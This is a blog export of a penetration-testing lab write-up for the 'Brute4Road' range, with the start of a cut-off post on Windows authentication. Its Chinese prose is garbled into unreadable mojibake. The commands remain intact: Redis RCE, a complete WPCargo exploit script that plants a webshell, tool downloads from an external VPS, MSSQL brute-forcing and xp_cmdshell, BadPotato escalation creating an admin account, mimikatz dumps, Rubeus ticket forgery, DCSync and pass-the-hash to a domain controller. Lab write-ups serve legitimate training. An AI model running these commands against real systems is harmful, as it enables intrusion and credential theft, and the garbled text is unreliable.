Brute4Roadæ˜¯ä¸€å¥—éš¾åº¦ä¸ºä¸­ç­‰çš„é¶åœºç¯å¢ƒï¼Œå®Œæˆè¯¥æŒ‘æˆ˜å¯ä»¥å¸®åŠ©ç©å®¶äº†è§£å†…ç½‘æ¸—é€ä¸­çš„ä»£ç†è½¬å‘ã€å†…ç½‘æ‰«æã€ä¿¡æ¯æ”¶é›†ã€ç‰¹æƒæå‡ä»¥åŠæ¨ªå‘ç§»åŠ¨æŠ€æœ¯æ–¹æ³•ï¼ŒåŠ å¼ºå¯¹åŸŸç¯å¢ƒæ ¸å¿ƒè®¤è¯æœºåˆ¶çš„ç†è§£ï¼Œä»¥åŠæŒæ¡åŸŸç¯å¢ƒæ¸—é€ä¸­ä¸€äº›æœ‰è¶£çš„æŠ€æœ¯è¦ç‚¹ã€‚è¯¥é¶åœºå…±æœ‰4ä¸ªflagï¼Œåˆ†å¸ƒäºä¸åŒçš„é¶æœºã€‚ ä¸»è¦æ¶‰åŠåˆ° redisä¸»ä»å¤åˆ¶ã€suid-base64è¯»æ–‡ä»¶ã€wordpress WPCargo6.9.0-rce getshellã€BadPotatoææƒã€Rubeus ç”³è¯·é’ˆå¯¹åŸŸæ§LDAP\\CIFS æœåŠ¡çš„ç¥¨æ®ã€WMICï¼ŒPTHæ¨ªå‘ç§»åŠ¨ &lt;1&gt; flag1(1) redisä¸»ä»å¤åˆ¶ getshell fscanæ‰«æå‘ç°ï¼Œ6379ç«¯å£å¼€æ”¾ ftpå¯ä»¥åŒ¿åç™»å½• å­˜åœ¨ redis æœªæˆæƒè®¿é—® æµ‹è¯•äº†å†™è®¡åˆ’ä»»åŠ¡åå¼¹shellï¼Œæç¤ºæ²¡æœ‰æƒé™ ä¸»ä»å¤åˆ¶rce å¾—åˆ°äº†shell ä¹Ÿå¯ä»¥åˆ©ç”¨msfçš„ redis_replication æ¨¡å— è¿™é‡Œ redisè¿æ¥ä¸ç¨³å®šï¼Œé‡ç½®äº†ä¸€ä¸‹é¶åœº (2) suid - base64è¯»æ–‡ä»¶æ‹¿åˆ°shellå åœ¨ /home/redis/flag/ ä¸‹å‘ç°flagæ–‡ä»¶ flag01 12#æ›´æ”¹äº¤äº’æ–¹å¼python -c 'import pty;pty.spawn(&quot;/bin/bash&quot;);' ç”¨æˆ·ä¸ºredisï¼Œæ²¡æœ‰æƒé™è¯»å–ï¼Œéœ€è¦ææƒ æŸ¥æ‰¾å…·æœ‰suidæƒé™çš„å¯æ‰§è¡Œç¨‹åº 12find / -perm -u=s -type f 2&gt;/dev/nullfind / -user root -perm -4000 -exec ls -ldb {} ; å‘ç°äº† /usr/bin/base64 1base64 &quot;/home/redis/flag/flag01&quot; | base64 --decode å¾—åˆ°flag1ï¼š &lt;2&gt; flag2(1) å†…ç½‘ä¿¡æ¯æ”¶é›†ifconfigã€ip addrã€arp -a æˆ– cat /etc/hostsè·å–å¾—åˆ°æ‰€åœ¨å†…ç½‘ç½‘æ®µ 172.22.2.7/24 ä¸Šä¼ ä¸€ä¸ªfscan æ‰«ä¸€ä¸‹cæ®µ 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455start infoscantrying RunIcmp2The current user permissions unable to send icmp packetsstart ping(icmp) Target 172.22.2.3 is alive(icmp) Target 172.22.2.7 is alive(icmp) Target 172.22.2.16 is alive(icmp) Target 172.22.2.18 is alive(icmp) Target 172.22.2.34 is alive[*] Icmp alive hosts len is: 5172.22.2.3:445 open172.22.2.7:21 open172.22.2.7:22 open172.22.2.7:6379 open172.22.2.16:1433 open172.22.2.34:445 open172.22.2.16:445 open172.22.2.18:445 open172.22.2.34:139 open172.22.2.18:139 open172.22.2.16:139 open172.22.2.34:135 open172.22.2.3:139 open172.22.2.16:135 open172.22.2.3:135 open172.22.2.18:80 open172.22.2.16:80 open172.22.2.18:22 open172.22.2.7:80 open172.22.2.3:88 open[*] alive ports len is: 20start vulscan[*] NetInfo:[*]172.22.2.3 [-&gt;]DC [-&gt;]172.22.2.3[*] NetInfo:[*]172.22.2.34 [-&gt;]CLIENT01 [-&gt;]172.22.2.34[*] WebTitle: http://172.22.2.16 code:404 len:315 title:Not Found[*] 172.22.2.3 (Windows Server 2016 Datacenter 14393)[*] NetBios: 172.22.2.34 XIAORANG\\CLIENT01 [*] NetInfo:[*]172.22.2.16 [-&gt;]MSSQLSERVER [-&gt;]172.22.2.16[*] NetBios: 172.22.2.16 MSSQLSERVER.xiaorang.lab Windows Server 2016 Datacenter 14393 [*] NetBios: 172.22.2.3 [+]DC DC.xiaorang.lab Windows Server 2016 Datacenter 14393 [*] WebTitle: http://172.22.2.7 code:200 len:4833 title:Welcome to CentOS[*] 172.22.2.16 (Windows Server 2016 Datacenter 14393)[*] NetBios: 172.22.2.18 WORKGROUP\\UBUNTU-WEB02 [+] ftp://172.22.2.7:21:anonymous [-&gt;]pub[*] WebTitle: http://172.22.2.18 code:200 len:57738 title:åˆä¸€ä¸ªWordPressç«™ç‚¹ æ‰«å‡ºæ¥äº†å­˜æ´»çš„å››å°ä¸»æœº 12345 172.22.2.3 DCTarget 172.22.2.7 Webç«™ç‚¹Target 172.22.2.16 Windows Server MSSQLSERVERTarget 172.22.2.18 WordPressç«™ç‚¹Target 172.22.2.34 ä¸Šä¼ frp æˆ–è€… vennom æä¸€ä¸ªsocksä»£ç† æˆ‘ä¹ æƒ¯ç”¨venom 1234curl http://vps:port/frpc --output frpccurl http://101.42.224.57:2222/agent_linux_x64 --output agentcurl http://101.42.224.57:2222/fscan_amd64 --output fscancurl http://vps:port/frpc.ini --output frpc.ini æ³¨ï¼šsocksåªèƒ½ä»£ç†tcpçš„æµé‡ï¼Œpingèµ°çš„æ˜¯icmpï¼Œæ‰€ä»¥æˆ‘ä»¬æŒ‚ä¸Šsocksä»£ç†ä¹Ÿæ˜¯pingä¸äº†çš„ã€‚ linux é‡Œé…ç½®proxychains ä»£ç† (2) wordpress WPCargo &lt; 6.9.0rce getshellä¹‹å wpscanæ‰«ä¸€ä¸‹ wordpressç«™ç‚¹ 1proxychains4 wpscan --url http://172.22.2.18/ å­˜åœ¨ wpcargoæ’ä»¶ version: 6.x.x WPCargo &lt; 6.9.0å­˜åœ¨ä¸€ä¸ªRCEæ¼æ´ ç½‘ä¸Šæœç´¢ WPCargo &lt; 6.9.0 - Unauthenticated RCE æŸ¥åˆ°ï¼š https://wpscan.com/vulnerability/5c21ad35-b2fb-4a51-858f-8ffff685de4a expå¦‚ä¸‹ï¼š 123456789101112131415161718192021222324import sysimport binasciiimport requests# This is a magic string that when treated as pixels and compressed using the png# algorithm, will cause &lt;?=$_GET[1]($_POST[2]);?&gt; to be written to the png filepayload = '2f49cf97546f2c24152b216712546f112e29152b1967226b6f5f50'def encode_character_code(c: int): return '{:08b}'.format(c).replace('0', 'x')text = ''.join([encode_character_code(c) for c in binascii.unhexlify(payload)])[1:]destination_url = 'http://127.0.0.1:8001/'cmd = 'whoami'# With 1/11 scale, '1's will be encoded as single white pixels, 'x's as single black pixels.requests.get( f&quot;{destination_url}wp-content/plugins/wpcargo/includes/barcode.php?text={text}&amp;sizefactor=.090909090909&amp;size=1&amp;filepath=/var/www/html/webshell.php&quot;)# We have uploaded a webshell - now let's use it to execute a command.print(requests.post( f&quot;{destination_url}webshell.php?1=system&quot;, data={&quot;2&quot;: cmd}).content.decode('ascii', 'ignore')) æŒ‚ä¸Šä»£ç†ä½¿ç”¨pythonè¿è¡Œ ä¸çŸ¥é“ä¸ºå•¥æŠ¥é”™äº† åæ¥æŠŠexp.pyä¸Šä¼ åˆ°å¤–ç½‘æœºè¿è¡Œæ‰æˆåŠŸ æˆåŠŸå†™å…¥shell å› ä¸ºå†™å…¥çš„æœ¨é©¬æ˜¯systemï¼Œæ‰€ä»¥è°ƒæ¢èšå‰‘è¿æ¥æ¨¡å¼ èšå‰‘è¿æ¥ æˆ‘çš„èšå‰‘å¥½åƒæ²¡æœ‰è¿™ä¸ªæ¨¡å¼ ï¼Œï¼Œï¼Œï¼Œï¼Œï¼Œï¼Œ é‚£å°±ç›´æ¥æ‰§è¡Œå‘½ä»¤å§ éƒ½ä¸€æ · åªä¸è¿‡èšå‰‘é‚£æ ·æŸ¥çœ‹æ–‡ä»¶æ›´æ¸…æ™°æ˜äº†ä¸€ç‚¹ ä¸‹è½½äº†æ–°ç‰ˆèšå‰‘ è¿æ¥ä¸Šå»ä¹‹å åœ¨ wp-config.php æŸ¥çœ‹ wordpressçš„é…ç½®æ–‡ä»¶ä¿¡æ¯ å¾—åˆ°äº†æ•°æ®åº“çš„ç”¨æˆ·åå’Œè¿æ¥å¯†ç  wpuser:WpuserEha8Fgj9 å³é”®æ•°æ®æ“ä½œ è¿æ¥ä¸Šå»çœ‹çœ‹ å¾—åˆ° flag02 &lt;3&gt; flag3(1) MSSqlServer RCEå†æŸ¥çœ‹æç¤º S0meth1ng_y0u_m1ght_1ntereSted è¯»å– å¾—åˆ°äº†ä¸€äº›ä¸ªå¯†ç  ç»“åˆç­¾å fscanæ‰«å‡ºæ¥çš„å†…ç½‘æœºå­ å¯èƒ½å­˜åœ¨ 172.22.2.16 è¿™å°MSSQLSERVER çš„å¯†ç  [*]172.22.2.16 [-&gt;]MSSQLSERVER [-&gt;]172.22.2.16 å°†å¯†ç å…¨éƒ¨å¯¼å‡º çˆ†ç ´ä¸€ä¸‹ MSSqlå¯†ç  è¿™é‡Œåˆ©ç”¨hydraå·¥å…· 1proxychains4 hydra -l sa -P pass.txt 172.22.2.16 mssql å¾—åˆ°å¯†ç  ElGNkOiC å¯ä»¥ä½¿ç”¨navicat + proxyxifier 123# å¼€å¯xp_cmdshellexec sp_configure 'show advanced options', 1;reconfigure;exec sp_configure 'xp_cmdshell',1;reconfigure; è¿™é‡Œç›´æ¥ä½¿ç”¨Multiple.Database.Utilization.Toolså·¥å…·è¿æ¥ ä¸‹è½½åœ°å€ï¼šhttps://github.com/SafeGroceryStore/MDUT å‰é¢fscan æ‰«æ ä¹Ÿå¾—åˆ°äº†è¿™å°æœºå­ç‰ˆæœ¬ Windows Server 2016 Datacenter 14393 æ‰§è¡Œ netstat -ano å¼€å¯äº†3389ç«¯å£ (2) Ladon BadPotatoææƒ&amp;rdpè¿œç¨‹ç™»å½•Windows Server 2016 å¯ä»¥ç”¨SweetPotatoææƒ é¡¹ç›®ä»‹ç»ï¼šä»Windows 7åˆ°Windows 10 / Server 2019çš„æœ¬åœ°æœåŠ¡åˆ°ç³»ç»Ÿæƒé™æå‡æ¼æ´ï¼Œä¹Ÿæ˜¯åœŸè±†å®¶æ—çš„æœ‰ä¸€ä¸ªææƒæ¼æ´ ä¸‹è½½åœ°å€ï¼šhttps://github.com/CCob/SweetPotato ä¸Šä¼ SweetPotato.exeææƒï¼Œå¾—åˆ°systemæƒé™ ä¸ç¡®å®šçš„è¯ ä¹Ÿå¯ä»¥ä¸Šä¼  Ladonä¸Šå» æ¿€æ´»Ole Automation Proceduresç»„ä»¶ï¼ŒæŠŠLadonä¸Šä¼ ä¸Šå» æµ‹è¯•ï¼ŒBadPotatoæˆåŠŸææƒ æ·»åŠ ç®¡ç†å‘˜ç”¨æˆ· 12C:/è¿…é›·ä¸‹è½½/Ladon911.exe BadPotato &quot;net user test 123qwe! /add&quot;C:/è¿…é›·ä¸‹è½½/Ladon911.exe BadPotato &quot;net localgroup administrators test /add&quot; åˆ›å»ºæˆåŠŸå rdp è¿œç¨‹ç™»å½• åœ¨ Administrator ç›®å½•ä¸‹å¾—åˆ°flag03 &lt;4&gt; flag4æ¶‰åŠåˆ°ä¸€äº› çº¦æŸå§”æ´¾ã€ç¥¨æ®æ–¹é¢çš„ ç”¨åˆ°çš„Rubeuså·¥å…· è¿˜æ²¡å­¦åˆ° å­¦äº†ä¹‹åå†è®°å½•ä¸€ä¸‹ â€” 2023.9.20 å­¦äº†NTLMã€Kerberosè®¤è¯ä¹‹åå†å›æ¥çœ‹ï¼Œç†Ÿæ‚‰äº†å¥½å¤š â€”â€“ 2023.10.13 mimikatzè·å–MSSQLSERVER$æœåŠ¡è´¦æˆ· hash åœ¨ 172.22.2.16 MSSQLæœºå™¨ä¸Šç»§ç»­è¿›è¡Œä¸€ä¸‹ä¿¡æ¯æœé›† systeminfo å¾—åˆ°åŸŸå xiaorang.lab ä¸Šä¼  mimikatz dumpä¸€ä¸‹å¯†ç  12privilege::debugsekurlsa::logonPasswords å¾—åˆ°æœåŠ¡ç”¨æˆ· MSSQLSERVER$ çš„hash æœåŠ¡è´¦æˆ·çš„è¯ï¼Œå¯ä»¥å°è¯•å§”æ´¾æ”»å‡» è¿™é‡Œ MSSQLSERVERæœºå™¨é…ç½®äº†åˆ° DC LDAP å’Œ CIFS æœåŠ¡çš„çº¦æŸæ€§å§”æ´¾ Rubeus ç”³è¯· CIFSæœåŠ¡çš„ç¥¨æ®é¦–å…ˆé€šè¿‡Rubeusç”³è¯·æœºå™¨è´¦æˆ·MSSQLSERVERçš„TGTï¼Œæ‰§è¡Œåï¼Œå°†å¾—åˆ° Base64 åŠ å¯†åçš„ TGT ç¥¨æ® 1.\\Rubeus.exe asktgt /user:MSSQLSERVER$ /rc4:d9bd25dd6f02e2de2bef5b7ecc32d609 /domain:xiaorang.lab /dc:DC.xiaorang.lab /nowrap ç„¶åä½¿ç”¨ S4U2Self æ‰©å±•ä»£è¡¨åŸŸç®¡ç†å‘˜ Administrator è¯·æ±‚é’ˆå¯¹åŸŸæ§ CIFS æœåŠ¡çš„ç¥¨æ®ï¼Œå¹¶å°†å¾—åˆ°çš„ç¥¨æ®ä¼ é€’åˆ°å†…å­˜ä¸­ 1.\\Rubeus.exe s4u /impersonateuser:Administrator /msdsspn:CIFS/DC.xiaorang.lab /dc:DC.xiaorang.lab /ptt /ticket:doIFmjCCBZagAwIBBaEDAgEWooIEqzCCBKdhggSjMIIEn6ADAgEFoQ4bDFhJQU9SQU5HLkxBQqIhMB+gAwIBAqEYMBYbBmtyYnRndBsMeGlhb3JhbmcubGFio4IEYzCCBF+gAwIBEqEDAgECooIEUQSCBE0XoovbtDvSDfrGD6oCksUnsPeYLnVEnioTn99BBg7LoOjtI9hUgJn9DHYBZQ1h3XmCdVW1vGCInQOAlC02qEI0adteG9ebbUfXc3tFB6VuFW7DQ1TgFJjfCRsY4QB0+ev092ubCP4RQZlWZoFSaW1dH/SSgtMdokWLiQ7+6xmPqDmgp4cV2NAJJLL5LgIZRFHd9eZRksMWT4EDU0me2E43o1aY07G/GrglLmalss3RcR+5zJ0aSVsHcBtbmNqvR60zhk1BAmtdrdi+JtN1ATgmFQ+9IDXSryQ6USfoC6FTwgi96pfa6NnR01xH2C6dYSevdAyWyjTgfl38BpA6vODYnD3htj7HSFSHo/buBRPIxqqa2yM3Od1siBdkCLas1uGVuxoocNxj3dgmTh7i2sLlwXBGXZqOKWH4E1lncF8b4DBpP2Tdkn9iRsFk9hIe3KP1oRHHmWyG3ipW2x24tplOeWqQDSlAczOQAY1gqZhNcTKgp0dzsOYVgXpP+vyQA5DznuSBivGtGiQbu2Xp+Dq31ZhMP4rli2uu95gAhb0RhByq/JIA6oWjiiRuTYZ1DLJ2stF2OUloHKvJlU6jI5AVwEvQnS09+QN7JDdqHhqsb8zyJamUQEt2UAKrINJzhRpTVjenHdr3dqrNVaLbu4JPvkKJc3UnSQqe+FqUCmsVHTnFF82zsUTrpuE7OyinHUjBYAY8Aixvhn+vO9+dajP34auIOuGt6SXK/j3Xb73AtNu9Tvmfs0t+Y8hTmhYNkn5uIRlV/azG1ncrJvfHEH9gqHoS9Ac5IsNHdo0jFg2Yqv4RNfLSc1u5R6yEK0rSf4D4YCSxPYpweHozTtJh1dROmhDJWZxJgqji3b/eqUIdjtu/HbbFZbHrs81TZ7og+3a0hwvlqQRu1JaHTe/ejiHhvN2cXaG6b9ClE81r1wZKWaUMmW3HFuYAlr8W0EDEHyQljZYgQVHJkwN6e9tWHwSyX7ZyecYD7UGgRBPZQVe+mVcCW5a3Yokj3hgQCjewFrDu+PHZadH1n5IAeJyUJxp9SWJySMF3tdNsV4jF9XQdJmRpvjLN2t+Qe4Nf/bS4Wn5aH3ItcTZyhVJ8rMCb5Z0Wcgs7Agg0c7RODkA85Pmht+NzJbL+nRUHpuBNewutYYmTvylUJ2+X6rec0LpeTFwZD17CwBtQOfYdq5zxMACjZhglAPUH8pWTjSctVEO5ts4/X4wupUMhp4MJqeBZTS/FdAF68hiNVfS8H73oKGH78V4Fv/ykGDuAeVvgGYAKKhBtZXVb2IVBtEmQ2Xp1LgAEdes6FHzSRty4QyKfhXncWzQ+OWwIKWmdZ08vR1xVWpCH7qQ52fig5yuUTnMyd3zMPZach6+EXcfpXgxzyorbfJN6Nu48rGCHu6CrNuARYzcWec1iavU9ncgHObDCSgVa5+At351/XVGzYjCGY2hduvCKF6mIdHEreSve0HqjgdowgdegAwIBAKKBzwSBzH2ByTCBxqCBwzCBwDCBvaAbMBmgAwIBF6ESBBDnUva0DOnt9p3oVtck8tU5oQ4bDFhJQU9SQU5HLkxBQqIZMBegAwIBAaEQMA4bDE1TU1FMU0VSVkVSJKMHAwUAQOEAAKURGA8yMDIzMTAxMzEwMTA0OFqmERgPMjAyMzEwMTMyMDEwNDhapxEYDzIwMjMxMDIwMTAxMDQ4WqgOGwxYSUFPUkFORy5MQUKpITAfoAMCAQKhGDAWGwZrcmJ0Z3QbDHhpYW9yYW5nLmxhYg== klist çœ‹ä¸€ä¸‹ï¼ŒæˆåŠŸç”³è¯·åˆ° è®¿é—® CIFSçš„ç¥¨æ® 1dir \\\\DC.xiaorang.lab\\c$ è®¿é—®åŸŸæ§æˆåŠŸ æœ€ç»ˆæ‰¾åˆ° flagåœ¨ c:\\Users\\Administrator\\flag\\flag04.txt 1type \\\\DC.xiaorang.lab\\c$\\Users\\Administrator\\flag\\flag04.txt å¾—åˆ°flagï¼š Rubeusç”³è¯· LDAPæœåŠ¡çš„ç¥¨æ®ç¬¬ä¸€æ­¥åŒç†ï¼Œå…ˆåˆ©ç”¨ MSSQLSERVER$ çš„Hashç”³è¯·TGT 1Rubeus.exe asktgt /user:MSSQLSERVER$ /rc4:d9bd25dd6f02e2de2bef5b7ecc32d609 /domain:xiaorang.lab /dc:DC.xiaorang.lab /nowrap ç„¶åé€šè¿‡Rubeusçš„S4U2Selfåè®®ä»£è¡¨åŸŸç®¡ç†å‘˜ç”³è¯·é’ˆå¯¹åŸŸæ§LDAPæœåŠ¡çš„ç¥¨æ®å¹¶æ³¨å…¥å†…å­˜å 1.\\Rubeus.exe s4u /impersonateuser:Administrator /msdsspn:LDAP/DC.xiaorang.lab /dc:DC.xiaorang.lab /ptt /ticket:doIFmjCCBZagAwIBBaEDAgEWooIEqzCCBKdhggSjMIIEn6ADAgEFoQ4bDFhJQU9SQU5HLkxBQqIhMB+gAwIBAqEYMBYbBmtyYnRndBsMeGlhb3JhbmcubGFio4IEYzCCBF+gAwIBEqEDAgECooIEUQSCBE32+yacGkAGRudVKX6Lf0gKhjEaMMWmsMznRtO6S+b7JZjjs6xO/TurXVZ+57qOoByxLnQK1Rs/qPJ6Zp5uNuVeYpJRNy/C6C9NbC06i1yr0DdvXvHWwSXmJMaCZgXNK6wTAphGJeiV2PeYigEc9con5C99wIz3UgAda9w7qazQE6Bt2riUc+Pp/aJqfXcdJhTXgY74oRfTYJicn5O0yOXbKFHiCo5tI1hCdPaGyCDDUASiGVwdVNYhTKUCpcA7tPwatcBkPcrjOLePfaznf6Y3WMy6jjRgeA+mlKAjiOzwVqp/V8NKRfdEKdgU5q/OZv7Sy4SDxEWs1lZ/LMlN5CXilDwRHUJfjrMY8xQ1HW2WjaXmlnzMXD5K/8XDj2Wn9caKtTFPbGd1oyiLBv2QUYie6wFEhrhVH9Udo25/bN9GCTNtxS3STH6hE+09upxtKwZ/xCu2ug9UoOxSCsn8yqWJwUwHrX6ax1Didg04ziA8iFkCYDrgELdJfCrpCzQz1bWs30oGAKh2pmVVpYhzgBfv3a0+yiyt97fIFAcd5gNiLn0/OTe5tJ3Lj32iNbbKQHrkHxq+54mDckWMKXRYwK18eMNUoR58mQlAPqa4BMbilxwWZA5qPG1R51/BJgOTvWUIkj5JDkZpGotOLBkRHoH8JZe4YfxurpyaZKYlmk3sTnre8deDsAOItf90yLdXVY24XBrxA25/Mgwu/utYGp/6ADmYkZGPr+8l4gySoDpg0VNZIULI/E2NqNQYDBABexvcXTVAcbURq3q9rHyPaJGEQbJDGXE5PBt8wlQXW9sZRUPurxE24ZcLxgFIp6UFgmVaJaDTdj/IiFqa9M8T/MJMqpWTivlOXn6abvgmIvgCab2MOmpIkpc6Xcq59879VMsdDghvHpUYp5Z+EWMsmrOLQCSWAFZxMgVN0UA9tLbbTJRWiZvYNpEZ4J0sV/c6OSAcFtfr/Kno5wNbGTfELb/QZNKeEVk+MPT3LG28vJFCVnyyrzh6X9rJ5P2Sr58xFw4mdSuyd4dS3hWNEFB7SlN+R0vO1pK8hF4XnJZn/ExnZSLg0Tr087uFTmqQTMnu7g6ys85SBSnf6ExtQxo4d+arvMZChV3SpYZGgJPHxAmYPrpm+oxa5FohEXeQaXSHy6hKiMGqO+LKSQO253dJ90b9EQ5p+wH2/7L26BHFH8Bat1JCW5Q1Mt/JaRdIp0Tv//F+2Kr2vlC92I5lNnBRxqZXVfuqGQUa4bclQeZleqdGhCrq4gFOavlmzAK/0dA5Tl75cpkIHWWSJURG//v708FV1yc314FZ54deVTTfvQWcmwssoS+DHqdhdBsU09SP3oBSViSMz+y+/AQGPw12gYGvwHVyA7m8C1Jm2EjiMBxlc2ieOj3RzeI1lo2f1vfWk/8DAABcaAo3uk9KbcQlYinxii6aqtoluXWfZaFbs6+D/M9Bop3epNA6hi2n8lKjgdowgdegAwIBAKKBzwSBzH2ByTCBxqCBwzCBwDCBvaAbMBmgAwIBF6ESBBAz2hwi+O3FNVL4HiirLZoSoQ4bDFhJQU9SQU5HLkxBQqIZMBegAwIBAaEQMA4bDE1TU1FMU0VSVkVSJKMHAwUAQOEAAKURGA8yMDIzMTAxMzEwMzYyM1qmERgPMjAyMzEwMTMyMDM2MjNapxEYDzIwMjMxMDIwMTAzNjIzWqgOGwxYSUFPUkFORy5MQUKpITAfoAMCAQKhGDAWGwZrcmJ0Z3QbDHhpYW9yYW5nLmxhYg== klist çœ‹ä¸€ä¸‹ï¼ŒæˆåŠŸç”³è¯·åˆ° è®¿é—® LDAPæœåŠ¡çš„ç¥¨æ® LDAP æœåŠ¡å…·æœ‰DCSyncæƒé™ï¼Œmimikatz dumpä¸‹æ¥administratoråŸŸç®¡çš„ hash 1mimikatz.exe &quot;lsadump::dcsync /domain:xiaorang.lab /user:Administrator&quot; exit å¾—åˆ°åŸŸç®¡ NTLM Hashï¼š1a19251fbd935969832616366ae3fe62 è·å¾—åŸŸç®¡çš„hashä¹‹åå¯ä»¥é€šè¿‡WMIæœåŠ¡ç™»å½•åŸŸæ§ 1proxychains4 python wmiexec.py -hashes :1a19251fbd935969832616366ae3fe62 Administrator@172.22.2.3 æˆ–è€…ç›´æ¥PTH æ‹¿ä¸‹åŸŸæ§ 1proxychains crackmapexec smb 172.22.2.3 -u administrator -H 1a19251fbd935969832616366ae3fe62 -d xiaorang.lab -x &quot;type c:\\Users\\Administrator\\flag\\flag04.txt&quot;","link":"/2023/09/20/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Brute4Road%E9%9D%B6%E5%9C%BA/"},{"title":"ç¬¬äºŒç« -Windowsè®¤è¯æœºåˆ¶å’Œåè®®","text":"&lt;1&gt; Windowsè®¤è¯(1) Windowsè®¤è¯åŸºç¡€windowsçš„è®¤è¯åŒ…æ‹¬ä¸‰ä¸ªéƒ¨åˆ†ï¼š æœ¬åœ°è®¤è¯ï¼šç”¨æˆ·ç›´æ¥æ“ä½œè®¡ç®—æœºç™»å½•è´¦æˆ· ç½‘ç»œè®¤è¯ï¼šè¿œç¨‹è¿æ¥åˆ°å·¥ä½œç»„ä¸­çš„æŸä¸ªè®¾å¤‡ åŸŸè®¤è¯ï¼šç™»å½•åˆ°åŸŸç¯å¢ƒä¸­çš„æŸä¸ªè®¾å¤‡ windowsè®¤è¯å’Œå¯†ç çš„æŠ“å–å¯ä»¥è¯´æ˜¯å†…ç½‘æ¸—é€çš„ç¬¬ä¸€æ­¥ (2) windowsæœ¬åœ°è®¤è¯ç”µè„‘ä¸Šå­˜å‚¨ç€è‡ªå·±çš„è´¦å·å¯†ç ï¼Œæ— è®ºç”µè„‘æ˜¯å¦è”ç½‘ã€é€šå¤–ç½‘ï¼Œåªè¦èƒ½å¼€æœºï¼Œå°±å¯ä»¥è¾“å…¥è´¦å·å¯†ç ç™»å½•åˆ°ç”µè„‘ä¸­ï¼Œå·¥ä½œç»„å°±æ˜¯é‡‡ç”¨æœ¬åœ°è®¤è¯ Windowsçš„ç™»é™†å¯†ç æ˜¯å‚¨å­˜åœ¨ç³»ç»Ÿæœ¬åœ°çš„SAMæ–‡ä»¶ä¸­çš„ï¼Œåœ¨ç™»é™†Windowsçš„æ—¶å€™ï¼Œç³»ç»Ÿä¼šå°†ç”¨æˆ·è¾“å…¥çš„å¯†ç ä¸ SAMæ–‡ä»¶ä¸­çš„å¯†ç è¿›è¡Œå¯¹æ¯”ï¼Œå¦‚æœç›¸åŒï¼Œåˆ™è®¤è¯æˆåŠŸ SAMæ–‡ä»¶æ˜¯ä½äº %SystemRoot%\\system32\\config\\ ç›®å½•ä¸‹çš„ï¼Œç”¨äºå‚¨å­˜æœ¬åœ°æ‰€æœ‰ç”¨æˆ·çš„å‡­è¯ä¿¡æ¯ Windowsæœ¬åœ°è®¤è¯æµç¨‹ å…¶ä¸­ï¼š Windows Logon Processï¼ˆå³winlogon.exeï¼‰ï¼šæ˜¯Windows NT ç”¨æˆ·ç™»é™†ç¨‹åºï¼Œç”¨äºç®¡ç†ç”¨æˆ·ç™»é™†å’Œé€€å‡º LSASSï¼šä¸€ä¸ªç³»ç»Ÿè¿›ç¨‹ï¼Œç”¨äºå¾®è½¯Windowsç³»ç»Ÿçš„å®‰å…¨æœºåˆ¶ï¼Œå®ƒç”¨äºæœ¬åœ°å®‰å…¨å’Œç™»é™†ç­–ç•¥ ç”¨æˆ·æ³¨é”€ã€é‡å¯ã€é”å±åï¼Œæ“ä½œç³»ç»Ÿä¼šè®©winlogon.exe æ˜¾ç¤ºå¼€æœºç™»é™†ç•Œé¢ï¼Œæ¥æ”¶ç”¨æˆ·çš„è¾“å…¥ä¿¡æ¯åï¼Œå°†å¯†ç äº¤ç»™lsassè¿›ç¨‹ï¼Œè¿™ä¸ªè¿‡ç¨‹ä¸­ä¼šå­˜ä¸€ä»½æ˜æ–‡å¯†ç ï¼Œå°†æ˜æ–‡å¯†ç åŠ å¯†æˆNTLM Hashï¼Œå¯¹SAMæ•°æ®åº“è¿›è¡Œæ¯”è¾ƒè®¤è¯ (3) SAMæ–‡ä»¶å’Œlsass.exeè¿›ç¨‹è¯¦è§£SAMæ–‡ä»¶æ˜¯Windowsçš„ç”¨æˆ·è´¦æˆ·æ•°æ®åº“ï¼Œæ‰€æœ‰ç”¨æˆ·çš„ç™»å½•ååŠå£ä»¤ç­‰ç›¸å…³ä¿¡æ¯éƒ½ä¼šä¿å­˜åœ¨è¿™ä¸ªæ–‡ä»¶é‡Œï¼Œæ ¼å¼å¦‚ä¸‹ï¼š ç”¨æˆ·åç§°:LM-HASHå€¼:NTLM-HASHå€¼ æ³¨ï¼šSAMæ–‡ä»¶ä¸­çš„å¯†ç å¹¶ä¸æ˜¯ä»¥æ˜æ–‡çš„å½¢å¼å­˜åœ¨ï¼Œä»–æ˜¯åŠ å¯†åå­˜å‚¨åœ¨SAMæ–‡ä»¶ä¸­ Lsass.exeçš„è¿›ç¨‹ä½œç”¨éå¸¸é‡è¦ï¼Œå®ƒä¸»è¦è´Ÿè´£ç®¡ç†æœ¬åœ°å®‰å…¨ç­–ç•¥å’Œè®¤è¯æœºåˆ¶ã€‚è¿™äº›ç­–ç•¥åŒ…æ‹¬ å¯†ç ç­–ç•¥ã€è´¦æˆ·ç­–ç•¥ã€ç”¨æˆ·æƒé™ã€åŸŸç­–ç•¥ç­‰ç­‰ã€‚åŒæ—¶ï¼Œå®ƒè¿˜è´Ÿè´£å¯¹ç”¨æˆ·è¿›è¡Œèº«ä»½è®¤è¯ï¼Œä»¥ç¡®ä¿åªæœ‰æˆæƒçš„ç”¨æˆ·æ‰èƒ½è®¿é—®ç³»ç»Ÿèµ„æº å°† winlogon.exe ä¼ è¿‡æ¥çš„æ˜æ–‡è´¦å·å¯†ç è¿›è¡ŒåŠ å¯†ï¼Œç„¶åå’ŒSAMæ–‡ä»¶ä¸­çš„å¯†æ–‡è´¦å·å¯†ç ä½œæ¯”å¯¹ã€‚æ¯”å¯¹æˆåŠŸåˆ™ç™»å½•æˆåŠŸ å°†æ”¶åˆ°çš„æ˜æ–‡è´¦å·å¯†ç åœ¨æœ¬åœ°å†…å­˜ä¸­ä¿ç•™ä¸€ä»½å¤‡ç”¨ (å› æ­¤å¯ä»¥åœ¨å†…å­˜æŠ“æ˜æ–‡å¯†ç ) (4) æœ‰ä»€ä¹ˆæ–¹å¼è¯»å–SAMæ–‡ä»¶ åœ¨çº¿è¯»å–ï¼ˆå¦‚æœæœ‰æ€è½¯ï¼Œè¯»å–å·¥å…·å¯èƒ½ä¼šè¢«æ€ï¼Œéœ€è¦ç»•æ€è½¯ï¼‰ 12# ä½¿ç”¨mimikatzåœ¨çº¿è¯»mimikatz.exe &quot;privilege::debug&quot; &quot;token::elevate&quot; &quot;lsadump::sam&quot; exit ç¦»çº¿è¯»å–ï¼ˆæ–‡ä»¶å¤åˆ¶åˆ°ä½ 